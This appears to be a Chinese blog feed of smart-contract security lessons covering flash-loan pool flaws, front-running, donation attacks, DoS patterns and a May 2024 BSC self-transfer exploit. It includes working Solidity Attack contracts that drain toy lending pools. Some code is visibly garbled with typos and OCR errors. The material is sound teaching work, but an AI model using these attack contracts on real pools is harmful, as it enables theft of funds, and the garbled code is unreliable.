该合约的漏洞在于目标合约的低代码调用。由于这里没有任何验证机制，并且调用函数提供了广泛的操作能力，例如获取LenderPool中MyToken代币的授权，因此可以从池中抽取所有资产。<br> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> // SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.18;</span><br><span class="line">import &quot;@openzeppelin/contracts/utils/Address.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/access/Ownable.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract LenderPool is ReentrancyGuard &#123;</span><br><span class="line">    using Address for address;</span><br><span class="line"></span><br><span class="line">    MyToken public token;</span><br><span class="line"></span><br><span class="line">    error RepayFailed();</span><br><span class="line"></span><br><span class="line">    constructor(MyToken _token) &#123;</span><br><span class="line">        token = _token;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flashLoan(</span><br><span class="line">        uint256 amount,</span><br><span class="line">        address borrower,</span><br><span class="line">        address target,</span><br><span class="line">        bytes calldata data</span><br><span class="line">    ) external nonReentrant returns (bool) &#123;</span><br><span class="line">        uint256 balanceBefore = token.balanceOf(address(this));</span><br><span class="line">        bool ret = token.transfer(borrower, amount);</span><br><span class="line"></span><br><span class="line">        // it&#x27;s dangerous</span><br><span class="line">        target.functionCall(data);</span><br><span class="line"></span><br><span class="line">        if (token.balanceOf(address(this)) &lt; balanceBefore)</span><br><span class="line">            revert RepayFailed();</span><br><span class="line"></span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract MyToken is ERC20, Ownable &#123;</span><br><span class="line">    constructor() ERC20(&quot;MyToken&quot;, &quot;MTK&quot;) Ownable(msg.sender) &#123;</span><br><span class="line">        _mint(msg.sender, 10000 * 10**decimals());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>在<strong>Attack合约</strong>的攻击函数中，攻击者从池合约发起一次闪电贷，借入 0 个代币，因为此时他们不需要这些代币。相反，他们构造 calldata以获得<strong>LenderPool</strong>的批准。一旦<strong>flashLoan</strong>函数成功执行，他们就会获得授权并执行<strong>transferFrom</strong>操作将代币转移到自己的地址。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line">    LenderPool pool;</span><br><span class="line">    MyToken token;</span><br><span class="line"></span><br><span class="line">    constructor(address _pool, address _token) &#123;</span><br><span class="line">        pool = LenderPool(_pool);</span><br><span class="line">        token = MyToken(_token);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack()</span><br><span class="line">        public</span><br><span class="line">        returns (uint256 before_balance, uint256 after_balance)</span><br><span class="line">    &#123;</span><br><span class="line">        before_balance = token.balanceOf(address(this));</span><br><span class="line">        bytes memory _calldata = abi.encodeWithSignature(</span><br><span class="line">            &quot;approve(address,uint256)&quot;,</span><br><span class="line">            address(this),</span><br><span class="line">            10000</span><br><span class="line">        );</span><br><span class="line">        pool.flashLoan(0, address(this), address(token), _calldata);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        token.transferFrom(address(pool), address(this), 10000);</span><br><span class="line">        after_balance = token.balanceOf(address(this));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="闪电贷贷款人漏洞2"><a href="#闪电贷贷款人漏洞2" class="headerlink" title="闪电贷贷款人漏洞2"></a>闪电贷贷款人漏洞2</h3><p>这是一个具有漏洞的合约</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line">import &quot;solady/src/utils/SafeTransferLib.sol&quot;;</span><br><span class="line"></span><br><span class="line">interface IFlashLoanEtherReceiver &#123;</span><br><span class="line">    function execute() external payable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract EthLenderPool &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    error RepayFailed();</span><br><span class="line">    event Deposit(address indexed who, uint256 amount);</span><br><span class="line">    event Withdraw(address indexed who, uint256 amount);</span><br><span class="line"></span><br><span class="line">    function deposit() external payable &#123;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            balances[msg.sender] += msg.value;</span><br><span class="line">        &#125;</span><br><span class="line">        emit Deposit(msg.sender, msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() external &#123;</span><br><span class="line">        uint256 amount = balances[msg.sender];</span><br><span class="line">        delete balances[msg.sender];</span><br><span class="line">        emit Withdraw(msg.sender, amount);</span><br><span class="line">        SafeTransferLib.safeTransferETH(msg.sender, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flashLoan(uint256 amount) external &#123;</span><br><span class="line">        uint256 balanceBefore = address(this).balance;</span><br><span class="line">        IFlashLoanEtherReceiver(msg.sender).execute&#123;value: amount&#125;();</span><br><span class="line">        if (address(this).balance &lt; balanceBefore)</span><br><span class="line">            revert RepayFailed();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>存款和取款函数用于存入和提取 ETH，用户 ETH 余额记录在合约的余额状态变量中。</li><li>flashLoan函数用于借出资金。在这里，借款人必须实现IFlashLoanEtherReceiver接口。当资金发送到借款人合约时，还会调用接口中定义的回调函数execute ，允许借款人执行自定义业务逻辑。但是，必须确保借入的资金偿还给贷方池，以保持余额大于或等于原始余额。否则将导致借贷失败。<blockquote><p>风险：只检查还款后的余额大小。但这个余额可能包括用户在合约中持有的资产，用户可以随时提取这些资产。</p></blockquote></li></ul><p>以下是攻击者合约，在执行回调函数中，攻击者将借入的资金存回池中，确保池子的余额不会减少，但这些资金现在被记录为攻击者</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Attack is IFlashLoanEtherReceiver&#123;</span><br><span class="line">    EthLenderPool pool;</span><br><span class="line"></span><br><span class="line">    constructor(address _pool) &#123;</span><br><span class="line">        pool = EthLenderPool(_pool);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack(uint amount) public &#123;</span><br><span class="line">        pool.flashLoan(amount);</span><br><span class="line">        pool.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function execute() external payable &#123;</span><br><span class="line">        pool.deposit&#123;value: msg.value&#125;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="抢跑交易"><a href="#抢跑交易" class="headerlink" title="抢跑交易"></a>抢跑交易</h2><p>它的本质就是利用了交易顺序进行获利</p><p>先说以下内涵，通俗来讲，就是被人比你快一步，因为在区块链上的交易都是公开透明的，就是能够获取其他人的交易，攻击者发现了你的交易信息，然后他支出更高的gas费用，在你之前进行交易，就会导致一些问题出现</p><blockquote><p>在以太坊交易中，当你发起一个交易时，首先会进行打包进入交易池，然后矿工来处理这些交易，当然，优先处理gas费更高的交易<br>举例：这是一个猜谜游戏，猜对即可获得10个ehter</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier:MIT</span><br><span class="line"></span><br><span class="line">pragma solidity^0.8.17;</span><br><span class="line"></span><br><span class="line">constract FindThisHash&#123;</span><br><span class="line">    bytes32 public constant hash = 111111;</span><br><span class="line"></span><br><span class="line">    constructor () payable &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function solve (string memory solution) public&#123;</span><br><span class="line">        require(hash == keccak256(abi.encodePascked(solution)),&quot;Incorrect answer&quot;);</span><br><span class="line">        (bool sent, ) = msg.sender.call&#123;value：10 ehter&#125;(&quot;&quot;);</span><br><span class="line">        require(sent,&quot;Failed to send Ehter&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>A猜中了答案，调用了solve函数输入正确的答案此时的gas的价格设置为15gwei，然后有个人在交易池发现了这个，B就获取了A的答案，他又用比15gwei高的价格调用solve函数，然后矿工就会先处理B的交易，最后B获得了10以太币的奖励</p><h3 id="预防措施-1"><a href="#预防措施-1" class="headerlink" title="预防措施"></a>预防措施</h3><p>采用 Commit-Reveal 的模式，该方案有两个阶段：Commit 阶段，提交特定的值（比如包含答案的 Hash 值，答案并没有直接暴露出来）；以及 Reveal 阶段，其中揭示并检查值（校验答案是否正确）。</p><p>为了更好地理解，可以想象一下，发送者 Alice 将一条消息放入一个上锁的盒子中，然后将其交给接收者 Bob。Bob 以及其他任何人无法访问该消息，因为它被锁在盒子里，但是当 Alice 想要透露该消息时，她可以解锁盒子并将该消息显示给 Bob。</p><h2 id="签名重放攻击"><a href="#签名重放攻击" class="headerlink" title="签名重放攻击"></a>签名重放攻击</h2>]]></content>
      
      
      
        <tags>
            
            <tag> 基本知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>抢先交易攻击</title>
      <link href="/2024/10/07/%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93%E6%94%BB%E5%87%BB/"/>
      <url>/2024/10/07/%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="抢先交易攻击"><a href="#抢先交易攻击" class="headerlink" title="抢先交易攻击"></a>抢先交易攻击</h2><h3 id="交易抢跑"><a href="#交易抢跑" class="headerlink" title="交易抢跑"></a>交易抢跑</h3><h4 id="漏洞描述："><a href="#漏洞描述：" class="headerlink" title="漏洞描述："></a>漏洞描述：</h4><p>交易抢跑是指攻击者在看到某个交易即将被矿工打包到区块中时，通过提高gas费迅速提交自己的交易，使其在原交易之前被打包。</p><h4 id="举例："><a href="#举例：" class="headerlink" title="举例："></a>举例：</h4><p>1.用户在去中心化交易所（如Uniswap）上提交一笔交易，希望以较低价格购买某种代币。<br>2.攻击者看到这一交易后，立即提交一笔相同的交易，但设置更高的交易费用（gas price），使其交易优先被处理。<br>3.结果，攻击者以较低价格获得代币，随后再以高价出售，获取利润。</p><h3 id="价格抢跑"><a href="#价格抢跑" class="headerlink" title="价格抢跑"></a>价格抢跑</h3><h4 id="漏洞描述：-1"><a href="#漏洞描述：-1" class="headerlink" title="漏洞描述："></a>漏洞描述：</h4><p>价格抢跑发生在用户的交易影响了某个资产的价格，而攻击者在价格变动前迅速提交交易，从中获利。<br>举例：<br>1.在某个拍卖合约中，用户提交了一个出价，导致价格上涨。<br>2.攻击者注意到这一变化，并在用户出价被确认之前，提交自己的出价。<br>3.攻击者以更低的价格赢得拍卖，获取资产。</p><h3 id="状态抢跑"><a href="#状态抢跑" class="headerlink" title="状态抢跑"></a>状态抢跑</h3><h4 id="漏洞描述：-2"><a href="#漏洞描述：-2" class="headerlink" title="漏洞描述："></a>漏洞描述：</h4><p>状态抢跑是指攻击者通过观察合约的状态变化，利用这些信息进行有利的交易。<br>举例：<br>1.一个合约的状态更新为可以提取奖励，用户提取前，攻击者监测到这个状态变化，立即提交提取请求。<br>2.这样，攻击者可以在用户提取奖励之前获取更多的奖励。</p><h3 id="交易插队"><a href="#交易插队" class="headerlink" title="交易插队"></a>交易插队</h3><h4 id="漏洞描述：-3"><a href="#漏洞描述：-3" class="headerlink" title="漏洞描述："></a>漏洞描述：</h4><p>交易插队是指攻击者通过提交多个交易，迫使用户的交易在后续交易中失效，或者通过更高的交易费用将用户的交易挤出区块。</p><h4 id="举例：-1"><a href="#举例：-1" class="headerlink" title="举例："></a>举例：</h4><p>用户提交了一笔重要的交易，攻击者故意在用户交易之前发送多笔低价值交易，提高网络拥堵，使用户的交易难以被打包。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 基本知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>捐款攻击</title>
      <link href="/2024/10/07/%E6%8D%90%E6%AC%BE%E6%94%BB%E5%87%BB/"/>
      <url>/2024/10/07/%E6%8D%90%E6%AC%BE%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="捐款攻击"><a href="#捐款攻击" class="headerlink" title="捐款攻击"></a>捐款攻击</h2><h3 id="该协议是否依赖于balance或者balanceof，而不是内部会计"><a href="#该协议是否依赖于balance或者balanceof，而不是内部会计" class="headerlink" title="该协议是否依赖于balance或者balanceof，而不是内部会计"></a>该协议是否依赖于balance或者balanceof，而不是内部会计</h3><h4 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>   在以太坊网络上，任何地址的余额（无论是以太币还是代币）都可以通过address(this).balance 或token.balanceof(address)查询。然而，外部账户的余额可以被外部操作（如其他合约调用、用户转账等）影响。依赖于外部状态（即余额）可能导致合约的内部逻辑失去一致性，因为外部账户的状态在合约运行期间是不可预测的。</p><h4 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h4><p>   首位存款人可以中断股份的锻造，如果总资产通过大量捐款被操纵，用户可能无法获得其存款的股份，攻击者操纵依赖于balanceof确定总资产金额并阻止其他用户通过存款换取股份</p>]]></content>
      
      
      
        <tags>
            
            <tag> 基本知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>拒绝服务攻击（DOS）</title>
      <link href="/2024/10/06/%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB%EF%BC%88DOS%EF%BC%89/"/>
      <url>/2024/10/06/%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB%EF%BC%88DOS%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h3 id="拒绝服务（DOS）攻击"><a href="#拒绝服务（DOS）攻击" class="headerlink" title="拒绝服务（DOS）攻击"></a>拒绝服务（DOS）攻击</h3><h3 id="未设定gas费率的外部调用"><a href="#未设定gas费率的外部调用" class="headerlink" title="未设定gas费率的外部调用"></a>未设定gas费率的外部调用</h3><p> 在以太坊中，每一笔交易都会携带一定数量的Gas，这是为了确保任何执行的操作都不会消耗过多的计算资源，从而避免网络拥堵或资源耗尽。当一笔交易开始执行时，它会从交易者提供的Gas总量中扣除费用，直到合约执行完成或Gas耗尽。如果在执行过程中Gas耗尽，那么交易将被回滚，且已经消耗的Gas不会退还给用户。</p><h4 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><p>   1， 攻击者可以通过构造高复杂度的交易或智能合约来故意消耗大量的Gas，从而正常交易无法被包含在区块中。例如，攻击者可以创建一个合约，该合约在接收到消息时执行大量计算或存储操作，消耗接近最大Gas限额的Gas量。当许多这样的交易被同时发送到网络时，它们会占据大部分甚至全部的Gas容量，导致其他用户的正常交易无法被确认，从而达到拒绝服务的效果。<br>   2，使智能合约进入无限循环，这将导致Gas立即耗尽，交易失败并回滚。这种攻击通常发生在合约逻辑中存在错误的情况下，例如没有正确处理循环退出条件，或在递归调用中缺少终止条件。当合约进入无限循环时，它会尝试消耗所有可用的Gas，最终导致交易失败，并可能使合约处于不可用状态。</p><h4 id="解决方法："><a href="#解决方法：" class="headerlink" title="解决方法："></a>解决方法：</h4><p>   使用call函数时可以调试出执行操作需要的大致gas费率，在call函数指定稍大一些费率，避免攻击发生。</p><h3 id="依赖外部的调用进展"><a href="#依赖外部的调用进展" class="headerlink" title="依赖外部的调用进展"></a>依赖外部的调用进展</h3><h4 id="漏洞分析：-1"><a href="#漏洞分析：-1" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><pre><code>这种情况是由于合约没有正确处理外部调用。例如，如果合约依赖于外部函数执行的结果，但合约没有对外部函数执行失败进行处理，此时如果外部调用失败或者由于外部原因而被拒绝时，会导致每次执行交易时都会因为这个失败问题导致交易回滚，合约无法继续执行。</code></pre><h4 id="举例："><a href="#举例：" class="headerlink" title="举例："></a>举例：</h4><p>   在竞拍合约中，出价者高成为king，并把上一位king的钱transfer回去，但是如果上一位king并不能接受钱的话,那么他就会一直成为king，就相当于拒绝其他人的出高价竞拍</p><h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h4><p>   在竞拍合约中尽量让合约参与者自提参与竞拍的token，其次如果确实需要对外部函数调用的结果进行处理才能进入新的状态，请考虑外部调用可能一直失败的情况，也可以添加基于时间的操作，防止外部函数调用一直无法满足require判断。</p><h3 id="Owner的错误操作"><a href="#Owner的错误操作" class="headerlink" title="Owner的错误操作"></a>Owner的错误操作</h3><h4 id="漏洞分析：-2"><a href="#漏洞分析：-2" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><p>   这种拒绝服务攻击就是建立在后期运营情况下，在智能合约中通常会存在以 Owner 账户作为管理员角色，该角色通常会持有很高的权限，例如开启或暂停转账功能，当 Owner 角色操作失误或私钥丢失可能会受到非主观意义上的拒绝服务攻击。</p><h4 id="解决方法：-1"><a href="#解决方法：-1" class="headerlink" title="解决方法："></a>解决方法：</h4><p>   建议设计多个owner地址，避免密钥遗失等问题发生时，导致合约被锁，同时一个综合系统中只有一个绝对权限的管理员是极其不安全的。</p><h3 id="数组或映射过长"><a href="#数组或映射过长" class="headerlink" title="数组或映射过长"></a>数组或映射过长</h3><h4 id="漏洞分析：-3"><a href="#漏洞分析：-3" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><pre><code>当合约中存在对传入的映射或数组循环遍历的逻辑且没有限制传入的映射或数组的长度时攻击者可以通过传入超长的映射或者数组进行循环遍历而大量消耗 Gas 从而该笔交易的 Gas 溢出，最后使得智能合约暂时或永久不可操作。</code></pre><h4 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h4><p>  在利益分发合约中，类似于公司给股东分红，如果员工人数过于多，即数组过大会导致操作执行的gas远远超于上限，从而导致交易失败，也就无法分红</p><h4 id="解决方法：-2"><a href="#解决方法：-2" class="headerlink" title="解决方法："></a>解决方法：</h4><p>   避免需要循环操作的数组或映射能够被外部调用，同时在合理的增长过程，可以采用分区块处理的方式，避免数组或映射过大失败。</p><h3 id="依赖库的问题"><a href="#依赖库的问题" class="headerlink" title="依赖库的问题"></a>依赖库的问题</h3><h4 id="漏洞分析：-4"><a href="#漏洞分析：-4" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><p>   依赖外部的合约库。如果外部合约的库被删除，那么所有依赖库的合约服务都无法使用。有些合约用于接受ether，并转账给其他地址。但是，这些合约本身并没有自己实现一个转账函数，而是通过delegatecall去调用一些其他合约中的转账函数去实现转账的功能。万一这些提供转账功能的合约执行suicide或self-destruct操作的话，那么，通过delegatecall调用转账功能的合约就有可能发生ether被冻结的情况</p><h4 id="举例-1"><a href="#举例-1" class="headerlink" title="举例"></a>举例</h4><p>  Parity 钱包遭受的第二次攻击是一个很好的例子。Parity 钱包提供了多签钱包的库合约。当库合约的函数被 delegatecall 调用时，它是运行在调用方（即：用户多签合约）的上下文里，像 m_numOwners 这样的变量都来自于用户多签合约的上下文。另外，为了能被用户合约调用，这些库合约的初始化函数都是public的。攻击者就调用初始化函数把自己设置为库函数的owner，在调用kill（）函数，把库合约删除，所有的ether就被冻结了</p><h4 id="解决方法：-3"><a href="#解决方法：-3" class="headerlink" title="解决方法："></a>解决方法：</h4><p>  继承库合约后，对于可以改变指智能合约存储状态的函数，尽量采取重写的方式，避免被恶意调用。特别是owner修饰词，转账函数。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 基本知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20240508 BSC攻击事件分析</title>
      <link href="/2024/09/29/20240508-BSC%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90/"/>
      <url>/2024/09/29/20240508-BSC%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="BSC攻击事件分析"><a href="#BSC攻击事件分析" class="headerlink" title="BSC攻击事件分析"></a>BSC攻击事件分析</h2><p>这是一起发生在2024年5月8日币安智能链（BSC）上的闪贷攻击事件，影响的是GPU代币合约。该合约存在自转账漏洞，每次自转账都会导致资产翻倍。黑客利用该漏洞，通过DODO协议以闪贷的方式借入BUSD，在PancakeSwap上兑换成GPU代币，再利用漏洞进行多次自转账，导致其GPU代币余额增加了100亿倍，达到28,070,259,409,924枚代币。最后，黑客将GPU代币卖出换成BUSD，用于偿还闪贷本息，最终窃取约3.2万美元资金。</p><p>首先攻击者从DODO借贷协议中发起闪电贷，借出BUSD到攻击合约地址，攻击者合约在调用PancakeSwap协议，将借出的BUSD兑换成GPU代币，利用自我转账漏洞，凭空产生CPU代币，攻击者合约自己给自己转账，每转账一次，GPU资产就会翻倍，攻击者合约将获取到的GPU代币发送到PancakeSwap V2协议中，换取BUSD。然后攻击者从PancakeSwap V2协议中获取的BUSD，将其中的一部分用于返还DODO借贷协议的本金和利息，剩下的都是攻击者所获得的。</p><p>完整的调用信息看<a href="https://app.blocksec.com/explorer/tx/bsc/0x2c0ada695a507d7a03f4f308f545c7db4847b2b2c82de79e702d655d8c95dadb?line=6">这里</a></p><p>下面是DODO协议中借贷协议中的借贷函数<strong>flashLoan</strong>的部分信息，用于从DODO协议资金池中借贷指定数量的资产，这里的参数baseAmount为零，而quoteAmount为226007，表示借贷这么多个BUSD，assetTo为攻击者合约地址，data则在回调函数中使用到<br>简单的讲该函数分为3个部分，第一个部分讲资产发送到目标地址，第二部分执行目标地址的回调函数，通常用于实现套利逻辑，第三部分校验是否归还本利息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function flashLoan(</span><br><span class="line">        uint256 baseAmount,</span><br><span class="line">        uint256 quoteAmount,</span><br><span class="line">        address assetTo,</span><br><span class="line">        bytes calldata data</span><br><span class="line">    ) external preventReentrant &#123;</span><br><span class="line">    // step1 transfer token to target address</span><br><span class="line">        _transferBaseOut(assetTo, baseAmount);</span><br><span class="line">        _transferQuoteOut(assetTo, quoteAmount);</span><br><span class="line"></span><br><span class="line">// step2 callback function</span><br><span class="line">        if (data.length &gt; 0)</span><br><span class="line">            IDODOCallee(assetTo).DPPFlashLoanCall(msg.sender, baseAmount, quoteAmount, data);</span><br><span class="line"></span><br><span class="line">        uint256 baseBalance = _BASE_TOKEN_.balanceOf(address(this));</span><br><span class="line">        uint256 quoteBalance = _QUOTE_TOKEN_.balanceOf(address(this));</span><br><span class="line"></span><br><span class="line">        // step3 check balance</span><br><span class="line">        require(</span><br><span class="line">            baseBalance &gt;= _BASE_RESERVE_ || quoteBalance &gt;= _QUOTE_RESERVE_,</span><br><span class="line">            &quot;FLASH_LOAN_FAILED&quot;</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        // ...;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>PancakeRouter</strong>合约，该合约主要用于BUSD和GPU代币的兑换，由于GPU合约会在兑换环节中收取手续费，兑换的另一个代币数量可能无法提前准确计算，因此这里使用了下面的<strong>swapExactTokenForTokensSupportingFeeOnTransferTokends函数</strong>，参数<strong>amountln</strong>表示往池子里存入的代币数量，而参数<strong>amountOutMin</strong>表示从池子里取出来另一种代币的最小数量，<strong>path</strong>代表代币的兑换路径，如 <strong>[address(A),address(B)]<strong>表示A代币兑换成B代币，参数</strong>to</strong> 表示兑换出来的代币转入目标地址，<strong>deadline</strong>为兑换有效日期<br>该函数简单分为以下几个部分，第一部分把A代币转入相应的池子中，第二部分通过**_swapSupportingFeeONTransferTokens函数<strong>计算B代币的数量并转给</strong>to<strong>地址，第三部分判断得到的B代币数量是否满足</strong>zamountOutMin**的要求</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function swapExactTokensForTokensSupportingFeeOnTransferTokens(</span><br><span class="line">    uint amountIn,</span><br><span class="line">    uint amountOutMin,</span><br><span class="line">    address[] calldata path,</span><br><span class="line">    address to,</span><br><span class="line">    uint deadline</span><br><span class="line">) external virtual override ensure(deadline) &#123;</span><br><span class="line">// step1 transfer A token to pool</span><br><span class="line">    TransferHelper.safeTransferFrom(</span><br><span class="line">        path[0], msg.sender, PancakeLibrary.pairFor(factory, path[0], path[1]), amountIn</span><br><span class="line">    );</span><br><span class="line">    uint balanceBefore = IERC20(path[path.length - 1]).balanceOf(to);</span><br><span class="line">    </span><br><span class="line">    // step2 calculate and transfer B token</span><br><span class="line">    _swapSupportingFeeOnTransferTokens(path, to);</span><br><span class="line">    </span><br><span class="line">    // step3 check B token amount</span><br><span class="line">    require(</span><br><span class="line">        IERC20(path[path.length - 1]).balanceOf(to).sub(balanceBefore) &gt;= amountOutMin,</span><br><span class="line">        &#x27;PancakeRouter: INSUFFICIENT_OUTPUT_AMOUNT&#x27;</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>GPU是一个普通的ERC20代币，他的转账函数如下，这里并没有进行<strong>from</strong> 和<strong>to</strong>的是否相等的判断，实际的转账逻辑正发生在父合约中，正是如此，这个漏洞很少被发现</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _transfer(</span><br><span class="line">  address from, address to, uint256 amount) internal override &#123;</span><br><span class="line">   require(from != address(0)，&quot;ERC20: transfer from the zero address&quot;); require(to != address(0)，&quot;ERC20: transfer to the zero address&quot;); require(amount&gt;0);</span><br><span class="line">   &#125;</span><br><span class="line">   if(_isExcludedFromFeesVip[from] || _isExcludedFromFeesVip[tol])&#123;</span><br><span class="line">    super._transfer(from, to, amount);You, 2 days ago &quot; add demo</span><br><span class="line">      return;</span><br><span class="line">       if(super.balance0f(address(this)) &gt;super.balance0f(uniswapV2Pair).div(2000))&#123;</span><br><span class="line">           if (_isExcludedFromFees[from] || _isExcludedFromFees[tol]) &#123;&#125; else &#123;</span><br><span class="line">                if(_isPairs[from])&#123;</span><br><span class="line">                      require(startTime &lt; block.timestamp,&quot;startTime&quot;);</span><br><span class="line">                     if(startTime.add(18 * 30 *86400) &gt; block. timestamp)&#123;</span><br><span class="line">                     super._transfer(from, _destroyAddress, amount.div(100).mul (2)); super._transfer(from, address(this)，amount.div(100).mul(1)); amount = amount.div(100).mul(97);</span><br><span class="line">                     &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>而父合约的_<strong>tranfer</strong>函数，也没有进行<strong>from</strong> 和<strong>to</strong> 是否相等的检查，</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _transfer(address sender,address recipient,uint256 amount )internal virtual &#123;</span><br><span class="line"></span><br><span class="line">       (requirelsender != address(0), &quot;ERC20: transfer from the zero address&quot;);</span><br><span class="line"></span><br><span class="line">      (require(recipient != address(0),&quot;ERC20: transfer to the zero address&quot;);</span><br><span class="line"></span><br><span class="line">          uint256 senderAmount = _balances [sender];</span><br><span class="line"></span><br><span class="line">          uint256 recipientAmount = _balances [recipient];</span><br><span class="line"></span><br><span class="line">          (requirelsenderAmount &gt;= amount,&quot;ERC20:transfer amount exceeds balance&quot;);</span><br><span class="line">  </span><br><span class="line">          _balances [sender]= senderAmount. sub(amount);</span><br><span class="line"></span><br><span class="line">          _balances[recipient] = recipientAmount.add(amount);</span><br><span class="line"></span><br><span class="line">        emit Transfer(sender, recipient, amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从以上代码我们可以看见，，在进行 transfer 时，先保存 from 和 to 的 balance 到变量 senderAmount 和 recipientAmount，随后计算转账后的 senderAmount 和 recipientAmount 的值，最后在更新到 balances 中。但是，当 from 和 to 为同一地址时，先更新 from 再更新 to 其实就是给 to 凭空添加了 amount 数量的 token。所以，攻击者通过持续给自己转账从而让自己的GPU Token凭空增多。</p><p>这个攻击成功就是利用了自我转账的漏洞，我认为要防御的话加个对转账地址和被转账地址是否相等的条件</p>]]></content>
      
      
      
        <tags>
            
            <tag> 攻击事件分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web3学习知识</title>
      <link href="/2024/09/29/web3%E5%AD%A6%E4%B9%A0%E7%9F%A5%E8%AF%86/"/>
      <url>/2024/09/29/web3%E5%AD%A6%E4%B9%A0%E7%9F%A5%E8%AF%86/</url>
      
